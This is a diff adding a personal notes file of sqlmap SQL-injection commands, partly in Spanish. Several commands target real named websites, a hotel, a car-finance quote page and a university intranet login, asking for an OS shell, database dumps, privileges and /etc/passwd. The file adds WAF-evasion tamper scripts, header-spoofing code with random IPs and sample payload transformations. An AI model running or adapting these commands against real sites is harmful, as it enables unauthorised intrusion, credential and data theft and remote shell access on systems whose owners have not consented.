@@ -1,0 +1,56 @@
+python sqlmap.py -u "http://127.0.0.1/sql_injeccion_blind/tiendarandom.php?id_producto=0"  --random-agent --level=5 --risk=3 --batch -v3  --os-shell --tamper=space2comment,modsecurityzeroversioned.py,informationschemacommnet.py,base64encode.py,charencode.py
+ -–threads=5  –banner -–beep
+
+C:\xampp\htdocs\FileOld\hack\sqli\Tool-SQLI-PHP\sqlmap-master>sqlmap.py -r "C:\Users\Alejandro\Desktop\asd.txt" -p "username,password" --method POST --random-agent --batch
+
+https://github.com/sqlmapproject/sqlmap/wiki/Usage
+C:\xampp\htdocs\FileOld\hack\sqli\Tool-SQLI-PHP\sqlmap-master>sqlmap.pyc -u "http://www.hotel-merlin.cz/los-precios.html?id=120" --os-shell --threads=10 --random-agent --technique="E" --dbms=mysql --timeout=10  --batch --dbs --privileges --current-user  --keep-alive --tamper=xforwardedfor,space2comment,charencode,modsecurityzeroversioned,informationschemacomment,randomcase --skip-waf --level=5 --risk=3 -v3
+ 
+
+
+http://cotiza.credinissan.com.mx/cotizador_nissan/index.aspx?l=1&bch=347N&state=
+
+--sqlmap-shell
+--current-user    para ver privilegios
+--privileges
+–file-read=/etc/passwd
+--cookie=COOKIE
+-D db --tables
+-D db -T nombre --columns
+-D db -T nombre --dump
+informationschemacommnet
+
+
+
+/sqlmap.py -u "http://www.uap.edu.pe/intranet/logon2.asp" --data="usuario=&pw=&user=07&B7=++Conectar++" -p "usuario" --level=5 --risk=5 --dbs
+
+tamper=informationschemacommnet.py,charencode.py,charendoublecode.py,base64encode.py,modsecurityzeroversioned.py,modsecurityverioned.py,versionedkeyword.py
+
+
+http://h30499.www3.hp.com/t5/Fortify-Application-Security/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366
+
+x-originating-IP: 127.0.0.1 /*Cabecera que verifican para ver ip si es de proxy*/
+
+  headers["X-Forwarded-For"] = randomIP()
+    headers["X-Client-IP"] = randomIP()
+    headers["X-Server-IP"] = randomIP()
+    headers["Remote_Addr"] = randomIP()
+    headers["X-Server-IP"] = randomIP()
+    headers["X-ProxyUser-Ip"] = randomIP()
+    headers["x-originating-IP"] = randomIP()
+    headers["X-remote-IP"] = randomIP()
+    headers["x-remote-addr"] = randomIP()
+
+/*!UNION*/ 
+ 
+Remplazar AND por && = %26%26
+
+ >>> tamper('1 AND 9227=9227')
+    '1--%0AAND--%0A9227=9227'
+
+   >>> tamper('1 AND 9227=9227')
+    '1%23%0AAND%23%0A9227=9227'
+
+
+    >>> tamper("1 AND '1'='1")--apotrohenullcode.py
+    '1 AND %00%271%00%27=%00%271'
